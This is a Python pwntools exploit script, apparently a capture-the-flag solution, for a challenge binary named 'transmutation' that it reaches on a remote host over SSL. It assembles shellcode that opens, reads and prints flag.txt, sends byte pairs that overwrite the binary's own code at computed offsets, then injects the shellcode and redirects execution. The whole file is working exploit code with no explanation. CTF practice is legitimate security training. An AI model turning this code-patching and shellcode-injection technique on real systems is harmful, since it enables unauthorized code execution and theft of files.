#!/usr/bin/env python3
from pwn import *

PORT = 8443
HOST = "transmutation.opus4-7.b01le.rs"
exe = context.binary = ELF('./chall', checksec=False)
context.arch = 'amd64'
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl = True)
else:
    p = exe.process()

#GDB()

sc = shellcraft.open("flag.txt", 0)
sc += shellcraft.read("rax", "rsp", 0x40)
sc += shellcraft.write(1, "rsp", "rax")
sc = asm(sc)

p.send(bytes([0x90, 72]))
p.send(bytes([0x00, 49]))

fini = 0x4011fc
chall = exe.sym.chall

for i, byte in enumerate(sc):
    p.send(bytes([byte, fini - chall + i]))

p.send(bytes([0x07, 0xAE]))
p.send(bytes([0xEB, 0xAD]))

p.send(bytes([0xC3, 72]))

p.interactive()
